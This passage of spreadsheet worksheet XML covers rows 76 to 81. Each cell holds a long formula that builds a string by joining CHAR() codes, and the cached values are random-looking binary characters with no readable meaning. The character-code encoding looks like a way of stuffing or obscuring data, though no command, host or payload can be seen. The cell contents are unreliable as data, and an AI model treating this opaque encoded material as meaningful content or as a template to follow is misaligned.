        <v>e0t-lÉª@5xTƒ_x0007_Š_x0018_~2_x0016_áž[–Ï¹¤ÅÑðr_x000D_ân÷­5ˆ®ˆ_x000C_ÿäFZ¥ÛwVœ¡W_x001F_¦Ìø_x0010_ƒK/Aj«ÙÝr°Ì¡X.FäN_x000C_ï;Õß_x0007_&lt;_x0003_W™¯Usdò;ºÆ_x0018_U_x001A_å§Õ¥12_&gt;÷¢_x000D_ÉÇØ_x000F_Àîz·{&amp;ygc_x0007_ ÂîŒ„_x000D_—ÅU6_x0018_Æ¥òû»®m«ž†©É7-F_x0017_YÓ%W[8¶#¡Šh~¸Îß¢éæhS‡ÍÍ¦ê©Æ]mtU°;®Y¯L¶_x001B_ñß²9¡0*_x000F_›ªð‰”:M¿Ñ_x0016_î²KZ¿VR»_x000F_¶âèfß¦ããÙ_x000B__x000E_]~åUà”¯­¶†´_x0017_ñ¥”u«&gt;ïL8š.)ªq±_x000F_w×Ð</v>
      </c>
      <c r="C76" t="str">
        <f>CHAR(221)&amp;CHAR(110)&amp;CHAR(123)&amp;CHAR(228)&amp;CHAR(114)&amp;CHAR(183)&amp;CHAR(246)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(142)</f>
        <v>Ýn{är·ö6ÍŽ</v>
      </c>
    </row>
    <row r="77" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B77" t="str">
        <f>CHAR(49)&amp;CHAR(157)&amp;CHAR(111)&amp;CHAR(27)&amp;CHAR(8)&amp;CHAR(72)&amp;CHAR(167)&amp;CHAR(80)&amp;CHAR(196)&amp;CHAR(132)&amp;CHAR(36)&amp;CHAR(188)&amp;CHAR(39)&amp;CHAR(27)&amp;CHAR(186)&amp;CHAR(243)&amp;CHAR(238)&amp;CHAR(166)&amp;CHAR(43)&amp;CHAR(172)&amp;CHAR(235)&amp;CHAR(86)&amp;CHAR(28)&amp;CHAR(196)&amp;CHAR(43)&amp;CHAR(198)&amp;CHAR(118)&amp;CHAR(88)&amp;CHAR(58)&amp;CHAR(68)&amp;CHAR(248)&amp;CHAR(54)&amp;CHAR(7)&amp;CHAR(18)&amp;CHAR(53)&amp;CHAR(26)&amp;CHAR(7)&amp;CHAR(251)&amp;CHAR(111)&amp;CHAR(181)&amp;CHAR(142)&amp;CHAR(113)&amp;CHAR(37)&amp;CHAR(180)&amp;CHAR(184)&amp;CHAR(55)&amp;CHAR(229)&amp;CHAR(192)&amp;CHAR(41)&amp;CHAR(95)&amp;CHAR(110)&amp;CHAR(225)&amp;CHAR(150)&amp;CHAR(231)&amp;CHAR(43)&amp;CHAR(88)&amp;CHAR(71)&amp;CHAR(78)&amp;CHAR(4)&amp;CHAR(237)&amp;CHAR(113)&amp;CHAR(40)&amp;CHAR(237)&amp;CHAR(131)&amp;CHAR(128)&amp;CHAR(211)&amp;CHAR(156)&amp;CHAR(81)&amp;CHAR(44)&amp;CHAR(251)&amp;CHAR(60)&amp;CHAR(65)&amp;CHAR(123)&amp;CHAR(116)&amp;CHAR(135)&amp;CHAR(74)&amp;CHAR(153)&amp;CHAR(242)&amp;CHAR(2)&amp;CHAR(207)&amp;CHAR(47)&amp;CHAR(230)&amp;CHAR(205)&amp;CHAR(50)&amp;CHAR(144)&amp;CHAR(53)&amp;CHAR(124)&amp;CHAR(23)&amp;CHAR(47)&amp;CHAR(24)&amp;CHAR(153)&amp;CHAR(166)&amp;CHAR(163)&amp;CHAR(79)&amp;CHAR(127)&amp;CHAR(127)&amp;CHAR(238)&amp;CHAR(145)&amp;CHAR(246)&amp;CHAR(168)&amp;CHAR(136)&amp;CHAR(255)&amp;CHAR(211)&amp;CHAR(45)&amp;CHAR(23)&amp;CHAR(200)&amp;CHAR(45)&amp;CHAR(249)&amp;CHAR(106)&amp;CHAR(254)&amp;CHAR(27)&amp;CHAR(218)&amp;CHAR(108)&amp;CHAR(211)&amp;CHAR(234)&amp;CHAR(154)&amp;CHAR(168)&amp;CHAR(70)&amp;CHAR(71)&amp;CHAR(124)&amp;CHAR(237)&amp;CHAR(221)&amp;CHAR(3)&amp;CHAR(35)&amp;CHAR(87)&amp;CHAR(162)&amp;CHAR(20)&amp;CHAR(116)&amp;CHAR(205)&amp;CHAR(204)&amp;CHAR(196)&amp;CHAR(45)&amp;CHAR(154)&amp;CHAR(165)&amp;CHAR(153)&amp;CHAR(32)&amp;CHAR(100)&amp;CHAR(206)&amp;CHAR(222)&amp;CHAR(211)&amp;CHAR(105)&amp;CHAR(104)&amp;CHAR(163)&amp;CHAR(134)&amp;CHAR(205)&amp;CHAR(176)&amp;CHAR(129)&amp;CHAR(147)&amp;CHAR(130)&amp;CHAR(18)&amp;CHAR(184)&amp;CHAR(194)&amp;CHAR(12)&amp;CHAR(89)&amp;CHAR(62)&amp;CHAR(85)&amp;CHAR(62)&amp;CHAR(89)&amp;CHAR(4)&amp;CHAR(209)&amp;CHAR(67)&amp;CHAR(175)&amp;CHAR(180)&amp;CHAR(223)&amp;CHAR(146)&amp;CHAR(11)&amp;CHAR(132)&amp;CHAR(93)&amp;CHAR(151)&amp;CHAR(15)&amp;CHAR(35)&amp;CHAR(165)&amp;CHAR(69)&amp;CHAR(95)&amp;CHAR(56)&amp;CHAR(144)&amp;CHAR(139)&amp;CHAR(174)&amp;CHAR(221)&amp;CHAR(132)&amp;CHAR(127)&amp;CHAR(77)&amp;CHAR(125)&amp;CHAR(215)&amp;CHAR(53)&amp;CHAR(95)&amp;CHAR(205)&amp;CHAR(183)&amp;CHAR(35)&amp;CHAR(200)&amp;CHAR(114)&amp;CHAR(195)&amp;CHAR(241)&amp;CHAR(191)&amp;CHAR(142)&amp;CHAR(32)&amp;CHAR(222)&amp;CHAR(148)&amp;CHAR(176)&amp;CHAR(117)&amp;CHAR(184)&amp;CHAR(35)&amp;CHAR(197)&amp;CHAR(135)&amp;CHAR(133)&amp;CHAR(114)&amp;CHAR(18)&amp;CHAR(142)&amp;CHAR(71)&amp;CHAR(58)&amp;CHAR(89)&amp;CHAR(104)&amp;CHAR(204)&amp;CHAR(130)&amp;CHAR(43)&amp;CHAR(114)&amp;CHAR(185)&amp;CHAR(8)&amp;CHAR(233)&amp;CHAR(195)&amp;CHAR(36)&amp;CHAR(208)&amp;CHAR(66)&amp;CHAR(251)&amp;CHAR(187)&amp;CHAR(76)&amp;CHAR(181)&amp;CHAR(4)&amp;CHAR(233)&amp;CHAR(226)&amp;CHAR(216)&amp;CHAR(115)&amp;CHAR(136)&amp;CHAR(229)&amp;CHAR(254)&amp;CHAR(255)&amp;CHAR(2)&amp;CHAR(178)&amp;CHAR(165)&amp;CHAR(159)&amp;CHAR(38)&amp;CHAR(90)&amp;CHAR(204)&amp;CHAR(152)&amp;CHAR(72)&amp;CHAR(22)&amp;CHAR(81)&amp;CHAR(126)&amp;CHAR(188)&amp;CHAR(12)&amp;CHAR(112)&amp;CHAR(198)&amp;CHAR(198)&amp;CHAR(73)&amp;CHAR(134)</f>
        <v>1o_x001B__x0008_H§PÄ„$¼'_x001B_ºóî¦+¬ëV_x001C_Ä+ÆvX:Dø6_x0007__x0012_5_x001A__x0007_ûoµŽq%´¸7åÀ)_ná–ç+XGN_x0004_íq(íƒ€ÓœQ,û&lt;A{t‡J™ò_x0002_Ï/æÍ25|_x0017_/_x0018_™¦£Oî‘ö¨ˆÿÓ-_x0017_È-ùjþ_x001B_ÚlÓêš¨FG|íÝ_x0003_#W¢_x0014_tÍÌÄ-š¥™ dÎÞÓih£†Í°“‚_x0012_¸Â_x000C_Y&gt;U&gt;Y_x0004_ÑC¯´ß’_x000B_„]—_x000F_#¥E_8‹®Ý„M}×5_Í·#ÈrÃñ¿Ž Þ”°u¸#Å‡…r_x0012_ŽG:YhÌ‚+r¹_x0008_éÃ$ÐBû»Lµ_x0004_éâØsˆåþÿ_x0002_²¥Ÿ&amp;ZÌ˜H_x0016_Q~¼_x000C_pÆÆI†</v>
      </c>
      <c r="C77" t="str">
        <f>CHAR(243)&amp;CHAR(96)&amp;CHAR(195)&amp;CHAR(216)&amp;CHAR(220)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(243)&amp;CHAR(106)</f>
        <v>ó`ÃØÜ6Íëój</v>
      </c>
    </row>
    <row r="78" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B78" t="str">
        <f>CHAR(159)&amp;CHAR(28)&amp;CHAR(237)&amp;CHAR(149)&amp;CHAR(88)&amp;CHAR(96)&amp;CHAR(4)&amp;CHAR(205)&amp;CHAR(27)&amp;CHAR(66)&amp;CHAR(234)&amp;CHAR(15)&amp;CHAR(51)&amp;CHAR(115)&amp;CHAR(84)&amp;CHAR(133)&amp;CHAR(5)&amp;CHAR(121)&amp;CHAR(149)&amp;CHAR(142)&amp;CHAR(157)&amp;CHAR(170)&amp;CHAR(243)&amp;CHAR(83)&amp;CHAR(147)&amp;CHAR(173)&amp;CHAR(225)&amp;CHAR(103)&amp;CHAR(175)&amp;CHAR(5)&amp;CHAR(149)&amp;CHAR(56)&amp;CHAR(36)&amp;CHAR(178)&amp;CHAR(101)&amp;CHAR(105)&amp;CHAR(73)&amp;CHAR(152)&amp;CHAR(5)&amp;CHAR(54)&amp;CHAR(204)&amp;CHAR(5)&amp;CHAR(42)&amp;CHAR(168)&amp;CHAR(220)&amp;CHAR(36)&amp;CHAR(128)&amp;CHAR(134)&amp;CHAR(80)&amp;CHAR(88)&amp;CHAR(180)&amp;CHAR(247)&amp;CHAR(152)&amp;CHAR(58)&amp;CHAR(214)&amp;CHAR(12)&amp;CHAR(164)&amp;CHAR(252)&amp;CHAR(250)&amp;CHAR(157)&amp;CHAR(235)&amp;CHAR(31)&amp;CHAR(60)&amp;CHAR(49)&amp;CHAR(209)&amp;CHAR(167)&amp;CHAR(25)&amp;CHAR(156)&amp;CHAR(107)&amp;CHAR(33)&amp;CHAR(131)&amp;CHAR(25)&amp;CHAR(81)&amp;CHAR(67)&amp;CHAR(18)&amp;CHAR(144)&amp;CHAR(22)&amp;CHAR(235)&amp;CHAR(101)&amp;CHAR(135)&amp;CHAR(214)&amp;CHAR(41)&amp;CHAR(170)&amp;CHAR(240)&amp;CHAR(39)&amp;CHAR(43)&amp;CHAR(200)&amp;CHAR(60)&amp;CHAR(129)&amp;CHAR(208)&amp;CHAR(91)&amp;CHAR(237)&amp;CHAR(102)&amp;CHAR(117)&amp;CHAR(39)&amp;CHAR(114)&amp;CHAR(124)&amp;CHAR(193)&amp;CHAR(16)&amp;CHAR(246)&amp;CHAR(109)&amp;CHAR(68)&amp;CHAR(102)&amp;CHAR(174)&amp;CHAR(233)&amp;CHAR(14)&amp;CHAR(137)&amp;CHAR(183)&amp;CHAR(34)&amp;CHAR(218)&amp;CHAR(239)&amp;CHAR(196)&amp;CHAR(114)&amp;CHAR(246)&amp;CHAR(240)&amp;CHAR(228)&amp;CHAR(162)&amp;CHAR(150)&amp;CHAR(55)&amp;CHAR(12)&amp;CHAR(109)&amp;CHAR(33)&amp;CHAR(174)&amp;CHAR(195)&amp;CHAR(78)&amp;CHAR(226)&amp;CHAR(166)&amp;CHAR(198)&amp;CHAR(193)&amp;CHAR(28)&amp;CHAR(128)&amp;CHAR(61)&amp;CHAR(41)&amp;CHAR(230)&amp;CHAR(147)&amp;CHAR(182)&amp;CHAR(101)&amp;CHAR(102)&amp;CHAR(90)&amp;CHAR(181)&amp;CHAR(112)&amp;CHAR(95)&amp;CHAR(71)&amp;CHAR(79)&amp;CHAR(76)&amp;CHAR(194)&amp;CHAR(73)&amp;CHAR(225)&amp;CHAR(48)&amp;CHAR(133)&amp;CHAR(248)&amp;CHAR(81)&amp;CHAR(78)&amp;CHAR(159)&amp;CHAR(189)&amp;CHAR(9)&amp;CHAR(190)&amp;CHAR(104)&amp;CHAR(14)&amp;CHAR(191)&amp;CHAR(32)&amp;CHAR(116)&amp;CHAR(225)&amp;CHAR(176)&amp;CHAR(36)&amp;CHAR(232)&amp;CHAR(78)&amp;CHAR(226)&amp;CHAR(107)&amp;CHAR(84)&amp;CHAR(253)&amp;CHAR(176)&amp;CHAR(150)&amp;CHAR(139)&amp;CHAR(89)&amp;CHAR(121)&amp;CHAR(248)&amp;CHAR(148)&amp;CHAR(254)&amp;CHAR(38)&amp;CHAR(197)&amp;CHAR(211)&amp;CHAR(122)&amp;CHAR(93)&amp;CHAR(52)&amp;CHAR(191)&amp;CHAR(77)&amp;CHAR(208)&amp;CHAR(88)&amp;CHAR(176)&amp;CHAR(186)&amp;CHAR(50)&amp;CHAR(114)&amp;CHAR(229)&amp;CHAR(225)&amp;CHAR(78)&amp;CHAR(106)&amp;CHAR(109)&amp;CHAR(130)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(204)&amp;CHAR(77)&amp;CHAR(1)&amp;CHAR(155)&amp;CHAR(19)&amp;CHAR(159)&amp;CHAR(251)&amp;CHAR(59)&amp;CHAR(84)&amp;CHAR(74)&amp;CHAR(213)&amp;CHAR(20)&amp;CHAR(22)&amp;CHAR(60)&amp;CHAR(52)&amp;CHAR(22)&amp;CHAR(200)&amp;CHAR(59)&amp;CHAR(42)&amp;CHAR(1)&amp;CHAR(217)&amp;CHAR(58)&amp;CHAR(121)&amp;CHAR(35)&amp;CHAR(93)&amp;CHAR(143)&amp;CHAR(24)&amp;CHAR(189)&amp;CHAR(239)&amp;CHAR(228)&amp;CHAR(40)&amp;CHAR(198)&amp;CHAR(141)&amp;CHAR(5)&amp;CHAR(127)&amp;CHAR(247)&amp;CHAR(227)&amp;CHAR(23)&amp;CHAR(24)&amp;CHAR(98)&amp;CHAR(109)&amp;CHAR(105)&amp;CHAR(7)&amp;CHAR(180)&amp;CHAR(157)&amp;CHAR(49)&amp;CHAR(184)&amp;CHAR(211)&amp;CHAR(201)&amp;CHAR(158)&amp;CHAR(65)&amp;CHAR(8)&amp;CHAR(170)&amp;CHAR(128)</f>
        <v>Ÿ_x001C_í•X`_x0004_Í_x001B_Bê_x000F_3sT…_x0005_y•ŽªóS“­ág¯_x0005_•8$²eiI˜_x0005_6Ì_x0005_*¨Ü$€†PX´÷˜:Ö_x000C_¤üúë_x001F_&lt;1Ñ§_x0019_œk!ƒ_x0019_QC_x0012__x0016_ëe‡Ö)ªð'+È&lt;Ð[ífu'r|Á_x0010_ömDf®é_x000E_‰·"ÚïÄröðä¢–7_x000C_m!®ÃNâ¦ÆÁ_x001C_€=)æ“¶efZµp_GOLÂIá0…øQNŸ½	¾h_x000E_¿ tá°$èNâkTý°–‹Yyø”þ&amp;ÅÓz]4¿MÐX°º2råáNjm‚_x0004__x0005_ÌM_x0001_›_x0013_Ÿû;TJÕ_x0014__x0016_&lt;4_x0016_È;*_x0001_Ù:y#]_x0018_½ïä(Æ_x0005_÷ã_x0017__x0018_bmi_x0007_´1¸ÓÉžA_x0008_ª€</v>
      </c>
      <c r="C78" t="str">
        <f>CHAR(49)&amp;CHAR(197)&amp;CHAR(245)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(44)&amp;CHAR(189)&amp;CHAR(235)&amp;CHAR(215)&amp;CHAR(253)</f>
        <v>1Åõ6Í,½ë×ý</v>
      </c>
    </row>
    <row r="79" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B79" t="str">
        <f>CHAR(37)&amp;CHAR(9)&amp;CHAR(84)&amp;CHAR(254)&amp;CHAR(22)&amp;CHAR(46)&amp;CHAR(127)&amp;CHAR(202)&amp;CHAR(161)&amp;CHAR(127)&amp;CHAR(147)&amp;CHAR(160)&amp;CHAR(158)&amp;CHAR(118)&amp;CHAR(78)&amp;CHAR(234)&amp;CHAR(189)&amp;CHAR(248)&amp;CHAR(161)&amp;CHAR(33)&amp;CHAR(206)&amp;CHAR(107)&amp;CHAR(227)&amp;CHAR(217)&amp;CHAR(45)&amp;CHAR(189)&amp;CHAR(218)&amp;CHAR(1)&amp;CHAR(167)&amp;CHAR(223)&amp;CHAR(219)&amp;CHAR(228)&amp;CHAR(106)&amp;CHAR(231)&amp;CHAR(241)&amp;CHAR(167)&amp;CHAR(205)&amp;CHAR(78)&amp;CHAR(108)&amp;CHAR(186)&amp;CHAR(92)&amp;CHAR(160)&amp;CHAR(177)&amp;CHAR(49)&amp;CHAR(118)&amp;CHAR(14)&amp;CHAR(131)&amp;CHAR(229)&amp;CHAR(213)&amp;CHAR(226)&amp;CHAR(66)&amp;CHAR(185)&amp;CHAR(135)&amp;CHAR(100)&amp;CHAR(172)&amp;CHAR(189)&amp;CHAR(28)&amp;CHAR(202)&amp;CHAR(74)&amp;CHAR(96)&amp;CHAR(44)&amp;CHAR(184)&amp;CHAR(219)&amp;CHAR(37)&amp;CHAR(101)&amp;CHAR(206)&amp;CHAR(102)&amp;CHAR(75)&amp;CHAR(120)&amp;CHAR(204)&amp;CHAR(33)&amp;CHAR(138)&amp;CHAR(87)&amp;CHAR(204)&amp;CHAR(184)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(137)&amp;CHAR(107)&amp;CHAR(143)&amp;CHAR(121)&amp;CHAR(223)&amp;CHAR(39)&amp;CHAR(41)&amp;CHAR(226)&amp;CHAR(248)&amp;CHAR(191)&amp;CHAR(198)&amp;CHAR(211)&amp;CHAR(90)&amp;CHAR(4)&amp;CHAR(249)&amp;CHAR(24)&amp;CHAR(29)&amp;CHAR(4)&amp;CHAR(145)&amp;CHAR(20)&amp;CHAR(175)&amp;CHAR(47)&amp;CHAR(32)&amp;CHAR(235)&amp;CHAR(127)&amp;CHAR(207)&amp;CHAR(121)&amp;CHAR(98)&amp;CHAR(205)&amp;CHAR(50)&amp;CHAR(179)&amp;CHAR(137)&amp;CHAR(111)&amp;CHAR(168)&amp;CHAR(26)&amp;CHAR(187)&amp;CHAR(129)&amp;CHAR(87)&amp;CHAR(164)&amp;CHAR(96)&amp;CHAR(54)&amp;CHAR(189)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(65)&amp;CHAR(221)&amp;CHAR(96)&amp;CHAR(5)&amp;CHAR(70)&amp;CHAR(159)&amp;CHAR(73)&amp;CHAR(29)&amp;CHAR(182)&amp;CHAR(213)&amp;CHAR(192)&amp;CHAR(59)&amp;CHAR(20)&amp;CHAR(238)&amp;CHAR(9)&amp;CHAR(246)&amp;CHAR(183)&amp;CHAR(153)&amp;CHAR(184)&amp;CHAR(47)&amp;CHAR(10)&amp;CHAR(73)&amp;CHAR(70)&amp;CHAR(52)&amp;CHAR(49)&amp;CHAR(251)&amp;CHAR(79)&amp;CHAR(153)&amp;CHAR(88)&amp;CHAR(73)&amp;CHAR(70)&amp;CHAR(103)&amp;CHAR(38)&amp;CHAR(74)&amp;CHAR(96)&amp;CHAR(181)&amp;CHAR(29)&amp;CHAR(81)&amp;CHAR(230)&amp;CHAR(52)&amp;CHAR(227)&amp;CHAR(26)&amp;CHAR(249)&amp;CHAR(152)&amp;CHAR(164)&amp;CHAR(76)&amp;CHAR(84)&amp;CHAR(10)&amp;CHAR(76)&amp;CHAR(89)&amp;CHAR(12)&amp;CHAR(166)&amp;CHAR(135)&amp;CHAR(27)&amp;CHAR(182)&amp;CHAR(100)&amp;CHAR(33)&amp;CHAR(168)&amp;CHAR(163)&amp;CHAR(25)&amp;CHAR(78)&amp;CHAR(238)&amp;CHAR(34)&amp;CHAR(121)&amp;CHAR(156)&amp;CHAR(51)&amp;CHAR(250)&amp;CHAR(253)&amp;CHAR(220)&amp;CHAR(126)&amp;CHAR(65)&amp;CHAR(143)&amp;CHAR(225)&amp;CHAR(81)&amp;CHAR(206)&amp;CHAR(122)&amp;CHAR(97)&amp;CHAR(3)&amp;CHAR(26)&amp;CHAR(127)&amp;CHAR(44)&amp;CHAR(151)&amp;CHAR(177)&amp;CHAR(16)&amp;CHAR(117)&amp;CHAR(144)&amp;CHAR(191)&amp;CHAR(214)&amp;CHAR(136)&amp;CHAR(131)&amp;CHAR(129)&amp;CHAR(229)&amp;CHAR(136)&amp;CHAR(222)&amp;CHAR(120)&amp;CHAR(142)&amp;CHAR(172)&amp;CHAR(111)&amp;CHAR(47)&amp;CHAR(58)&amp;CHAR(210)&amp;CHAR(10)&amp;CHAR(226)&amp;CHAR(119)&amp;CHAR(142)&amp;CHAR(161)&amp;CHAR(183)&amp;CHAR(197)&amp;CHAR(187)&amp;CHAR(11)&amp;CHAR(14)&amp;CHAR(104)&amp;CHAR(49)&amp;CHAR(84)&amp;CHAR(34)&amp;CHAR(148)&amp;CHAR(68)&amp;CHAR(195)&amp;CHAR(23)&amp;CHAR(152)&amp;CHAR(135)&amp;CHAR(83)&amp;CHAR(90)&amp;CHAR(78)&amp;CHAR(48)&amp;CHAR(56)&amp;CHAR(147)&amp;CHAR(8)&amp;CHAR(152)&amp;CHAR(127)&amp;CHAR(103)&amp;CHAR(79)&amp;CHAR(82)&amp;CHAR(223)</f>
        <v>%	Tþ_x0016_.Ê¡“ žvNê½ø¡!ÎkãÙ-½Ú_x0001_§ßÛäjçñ§ÍNlº\ ±1v_x000E_ƒåÕâB¹‡d¬½_x001C_ÊJ`,¸Û%eÎfKxÌ!ŠWÌ¸ûÏ‰kyß')âø¿ÆÓZ_x0004_ù_x0018__x001D__x0004_‘_x0014_¯/ ëÏybÍ2³‰o¨_x001A_»W¤`6½_x000B__x0002_AÝ`_x0005_FŸI_x001D_¶ÕÀ;_x0014_î	ö·™¸/
IF41ûO™XIFg&amp;J`µ_x001D_Qæ4ã_x001A_ù˜¤LT
LY_x000C_¦‡_x001B_¶d!¨£_x0019_Nî"yœ3úýÜ~AáQÎza_x0003__x001A_,—±_x0010_u¿ÖˆƒåˆÞxŽ¬o/:Ò
âwŽ¡·Å»_x000B__x000E_h1T"”DÃ_x0017_˜‡SZN08“_x0008_˜gORß</v>
      </c>
      <c r="C79" t="str">
        <f>CHAR(244)&amp;CHAR(240)&amp;CHAR(139)&amp;CHAR(227)&amp;CHAR(187)&amp;CHAR(142)&amp;CHAR(187)&amp;CHAR(118)&amp;CHAR(240)&amp;CHAR(19)</f>
        <v>ôð‹ã»Ž»vð_x0013_</v>
      </c>
    </row>
    <row r="80" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B80" t="str">
        <f>CHAR(143)&amp;CHAR(87)&amp;CHAR(228)&amp;CHAR(18)&amp;CHAR(200)&amp;CHAR(106)&amp;CHAR(154)&amp;CHAR(134)&amp;CHAR(5)&amp;CHAR(92)&amp;CHAR(209)&amp;CHAR(133)&amp;CHAR(118)&amp;CHAR(17)&amp;CHAR(100)&amp;CHAR(103)&amp;CHAR(158)&amp;CHAR(46)&amp;CHAR(173)&amp;CHAR(247)&amp;CHAR(32)&amp;CHAR(128)&amp;CHAR(108)&amp;CHAR(46)&amp;CHAR(226)&amp;CHAR(24)&amp;CHAR(220)&amp;CHAR(204)&amp;CHAR(119)&amp;CHAR(154)&amp;CHAR(249)&amp;CHAR(78)&amp;CHAR(109)&amp;CHAR(177)&amp;CHAR(55)&amp;CHAR(163)&amp;CHAR(14)&amp;CHAR(169)&amp;CHAR(4)&amp;CHAR(23)&amp;CHAR(111)&amp;CHAR(114)&amp;CHAR(27)&amp;CHAR(2)&amp;CHAR(235)&amp;CHAR(243)&amp;CHAR(10)&amp;CHAR(28)&amp;CHAR(226)&amp;CHAR(127)&amp;CHAR(61)&amp;CHAR(130)&amp;CHAR(165)&amp;CHAR(63)&amp;CHAR(251)&amp;CHAR(97)&amp;CHAR(108)&amp;CHAR(119)&amp;CHAR(102)&amp;CHAR(97)&amp;CHAR(204)&amp;CHAR(235)&amp;CHAR(167)&amp;CHAR(178)&amp;CHAR(162)&amp;CHAR(51)&amp;CHAR(148)&amp;CHAR(74)&amp;CHAR(40)&amp;CHAR(3)&amp;CHAR(199)&amp;CHAR(92)&amp;CHAR(242)&amp;CHAR(167)&amp;CHAR(254)&amp;CHAR(253)&amp;CHAR(71)&amp;CHAR(129)&amp;CHAR(52)&amp;CHAR(23)&amp;CHAR(221)&amp;CHAR(112)&amp;CHAR(245)&amp;CHAR(54)&amp;CHAR(52)&amp;CHAR(100)&amp;CHAR(213)&amp;CHAR(5)&amp;CHAR(23)&amp;CHAR(58)&amp;CHAR(163)&amp;CHAR(154)&amp;CHAR(41)&amp;CHAR(28)&amp;CHAR(12)&amp;CHAR(121)&amp;CHAR(69)&amp;CHAR(239)&amp;CHAR(237)&amp;CHAR(94)&amp;CHAR(174)&amp;CHAR(144)&amp;CHAR(92)&amp;CHAR(157)&amp;CHAR(196)&amp;CHAR(100)&amp;CHAR(40)&amp;CHAR(218)&amp;CHAR(10)&amp;CHAR(81)&amp;CHAR(122)&amp;CHAR(45)&amp;CHAR(88)&amp;CHAR(143)&amp;CHAR(84)&amp;CHAR(250)&amp;CHAR(70)&amp;CHAR(236)&amp;CHAR(168)&amp;CHAR(118)&amp;CHAR(86)&amp;CHAR(99)&amp;CHAR(144)&amp;CHAR(173)&amp;CHAR(240)&amp;CHAR(61)&amp;CHAR(202)&amp;CHAR(248)&amp;CHAR(219)&amp;CHAR(182)&amp;CHAR(245)&amp;CHAR(143)&amp;CHAR(115)&amp;CHAR(37)&amp;CHAR(64)&amp;CHAR(201)&amp;CHAR(80)&amp;CHAR(54)&amp;CHAR(245)&amp;CHAR(140)&amp;CHAR(247)&amp;CHAR(195)&amp;CHAR(228)&amp;CHAR(248)&amp;CHAR(185)&amp;CHAR(82)&amp;CHAR(168)&amp;CHAR(194)&amp;CHAR(30)&amp;CHAR(149)&amp;CHAR(215)&amp;CHAR(68)&amp;CHAR(183)&amp;CHAR(89)&amp;CHAR(172)&amp;CHAR(153)&amp;CHAR(251)&amp;CHAR(1)&amp;CHAR(250)&amp;CHAR(207)&amp;CHAR(73)&amp;CHAR(116)&amp;CHAR(14)&amp;CHAR(3)&amp;CHAR(67)&amp;CHAR(87)&amp;CHAR(246)&amp;CHAR(122)&amp;CHAR(129)&amp;CHAR(196)&amp;CHAR(24)&amp;CHAR(66)&amp;CHAR(242)&amp;CHAR(248)&amp;CHAR(192)&amp;CHAR(211)&amp;CHAR(165)&amp;CHAR(169)&amp;CHAR(218)&amp;CHAR(11)&amp;CHAR(36)&amp;CHAR(138)&amp;CHAR(153)&amp;CHAR(184)&amp;CHAR(101)&amp;CHAR(87)&amp;CHAR(228)&amp;CHAR(124)&amp;CHAR(187)&amp;CHAR(238)&amp;CHAR(89)&amp;CHAR(99)&amp;CHAR(46)&amp;CHAR(214)&amp;CHAR(153)&amp;CHAR(193)&amp;CHAR(169)&amp;CHAR(186)&amp;CHAR(8)&amp;CHAR(195)&amp;CHAR(59)&amp;CHAR(140)&amp;CHAR(124)&amp;CHAR(185)&amp;CHAR(76)&amp;CHAR(31)&amp;CHAR(24)&amp;CHAR(107)&amp;CHAR(196)&amp;CHAR(109)&amp;CHAR(120)&amp;CHAR(95)&amp;CHAR(229)&amp;CHAR(103)&amp;CHAR(178)&amp;CHAR(97)&amp;CHAR(128)&amp;CHAR(165)&amp;CHAR(30)&amp;CHAR(56)&amp;CHAR(33)&amp;CHAR(105)&amp;CHAR(241)&amp;CHAR(10)&amp;CHAR(118)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(1)&amp;CHAR(76)&amp;CHAR(102)&amp;CHAR(229)&amp;CHAR(114)&amp;CHAR(52)&amp;CHAR(61)&amp;CHAR(226)&amp;CHAR(178)&amp;CHAR(219)&amp;CHAR(44)&amp;CHAR(95)&amp;CHAR(147)&amp;CHAR(155)&amp;CHAR(80)&amp;CHAR(248)&amp;CHAR(33)&amp;CHAR(55)&amp;CHAR(147)&amp;CHAR(198)&amp;CHAR(77)&amp;CHAR(202)&amp;CHAR(232)&amp;CHAR(63)&amp;CHAR(35)&amp;CHAR(22)&amp;CHAR(53)&amp;CHAR(249)</f>
        <v>Wä_x0012_Èjš†_x0005_\Ñ…v_x0011_dgž.­÷ €l.â_x0018_ÜÌwšùNm±7£_x000E_©_x0004__x0017_or_x001B__x0002_ëó
_x001C_â=‚¥?ûalwfaÌë§²¢3”J(_x0003_Ç\ò§þýG4_x0017_Ýpõ64dÕ_x0005__x0017_:£š)_x001C__x000C_yEïí^®\Äd(Ú
Qz-XTúFì¨vVc­ð=ÊøÛ¶õs%@ÉP6õŒ÷Ãäø¹R¨Â_x001E_•×D·Y¬™û_x0001_úÏIt_x000E__x0003_CWözÄ_x0018_BòøÀÓ¥©Ú_x000B_$Š™¸eWä|»îYc.Ö™Á©º_x0008_Ã;Œ|¹L_x001F__x0018_kÄmx_åg²a€¥_x001E_8!iñ
v!¥_x0001_Lfår4=â²Û,_“›Pø!7“ÆMÊè?#_x0016_5ù</v>
      </c>
      <c r="C80" t="str">
        <f>CHAR(229)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(190)&amp;CHAR(124)&amp;CHAR(52)&amp;CHAR(14)&amp;CHAR(204)&amp;CHAR(235)</f>
        <v>åë»ë¾|4_x000E_Ìë</v>
      </c>
    </row>
    <row r="81" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B81" t="str">
